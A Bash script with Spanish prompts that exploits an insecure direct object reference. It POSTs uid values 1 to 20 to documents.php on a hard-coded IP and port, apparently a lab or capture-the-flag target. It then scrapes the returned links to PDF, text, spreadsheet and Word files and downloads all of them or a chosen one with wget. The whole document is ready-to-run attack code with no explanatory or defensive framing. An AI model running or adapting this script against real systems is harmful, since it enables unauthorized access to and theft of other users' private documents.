#!/bin/bash

url="http://83.136.255.170:59726"

declare -a FILES
declare -a LINKS
counter=1

echo "[*] Enumerando documentos..."

for i in {1..20}; do
    response=$(curl -s -X POST -d "uid=$i" "$url/documents.php")

    for link in $(echo "$response" | grep -oP "/documents/[^\"']+\.(pdf|txt|xlsx|docx)"); do
        FILES[$counter]="UID $i → $(basename "$link")"
        LINKS[$counter]="$url$link"
        echo "[$counter] ${FILES[$counter]}"
        ((counter++))
    done
done

if [[ ${#FILES[@]} -eq 0 ]]; then
    echo "[-] No se encontraron archivos."
    exit 0
fi

echo
read -p "¿Qué deseas hacer? (a = todos | n = ninguno | número = archivo específico): " opcion

if [[ "$opcion" == "a" ]]; then
    for i in "${!LINKS[@]}"; do
        echo "[↓] Descargando ${FILES[$i]}"
        wget -q "${LINKS[$i]}"
    done

elif [[ "$opcion" =~ ^[0-9]+$ ]] && [[ -n "${LINKS[$opcion]}" ]]; then
    echo "[↓] Descargando ${FILES[$opcion]}"
    wget -q "${LINKS[$opcion]}"

else
    echo "[*] No se descargó ningún archivo."
fi
